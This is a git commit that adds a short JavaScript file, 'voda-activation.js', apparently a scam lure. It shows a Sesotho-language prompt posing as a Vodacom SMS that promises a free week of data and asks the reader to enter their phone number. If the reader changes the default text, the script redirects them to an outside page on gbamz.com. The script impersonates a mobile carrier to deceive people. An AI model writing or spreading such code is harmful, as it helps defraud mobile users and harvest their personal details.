30fc536f605269437d4c499ef5f612f4b22d2cc7
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-29 07:50:32 +0100

    Create voda-activation.js

---
+++ voda-activation.js
@@ -0,0 +1,5 @@
+var password = 'SEBELISA BEKE E 1'
+password=prompt('SMS: Kea u lebohela, Nomoro ea hau ea Vodacom e loketse ho fumana Lintlha tse sebetsang tsa mahala bakeng sa Beke e 1, tobetsa OK ho Kenya Nomoro ea Hau ea Sehala','SEBELISA BEKE E 1');
+if (password != 'SEBELISA BEKE E 1') {
+location.href='https://gbamz.com/vodacom.html';
+}
